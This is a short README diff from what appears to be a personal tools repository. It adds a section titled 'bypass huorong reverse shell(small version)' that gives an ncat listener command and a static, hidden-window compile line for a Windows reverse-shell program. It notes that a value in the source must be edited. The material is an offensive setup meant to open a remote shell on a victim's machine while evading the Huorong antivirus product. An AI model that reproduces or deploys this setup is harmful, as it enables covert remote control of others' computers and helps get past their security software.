@@ -36,4 +36,9 @@ local ethernet address && gateway ipv4 address<br>
 用法<br>
 <code>gcc ./2.c -o 2</code><br>
 <code>./2</code><br>
+## bypass huorong reverse shell(small version)
+用法<br>
+<code>ncat -lvp 19482</code><br>
+<code>g++ 0.cpp -o 00 -lws2_32 -s -O2 -static -static-libgcc -static-libstdc++ -mwindows</code>
+需要修改0.cpp中的RyzU1
 ##### 2024年12月原创于中华人民共和国浙江省宁波市
